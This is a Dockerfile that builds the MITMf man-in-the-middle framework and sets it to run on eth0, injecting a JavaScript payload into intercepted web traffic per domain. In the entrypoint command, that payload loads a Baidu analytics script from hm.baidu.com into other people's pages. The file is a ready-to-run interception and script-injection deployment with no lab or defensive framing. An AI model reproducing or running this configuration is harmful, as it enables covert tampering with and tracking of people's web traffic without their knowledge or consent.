FROM ubuntu:wily
MAINTAINER ZhangJing <13821320100@outlook.com>

RUN apt-get update
RUN apt-get install -y net-tools iptables tcpdump git file python-pip python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev
RUN git clone https://github.com/online2311/MITMf /MITMf
WORKDIR /MITMf
RUN git submodule init && git submodule update --recursive
RUN pip install -r requirements.txt
VOLUME /MITMf/logs/

EXPOSE 10000
ENTRYPOINT ["python", "/MITMf/mitmf.py", "-i", "eth0", "--inject", "--js-payload", "var _hmt = _hmt || []; \ (function() { \   var hm = document.createElement("script"); \   hm.src = "//hm.baidu.com/hm.js?1ba9b58d5d0db75eb78ae0dffa1d0f5b"; \   var s = document.getElementsByTagName("script")[0]; \  s.parentNode.insertBefore(hm, s); \ })();", "--per-domain"]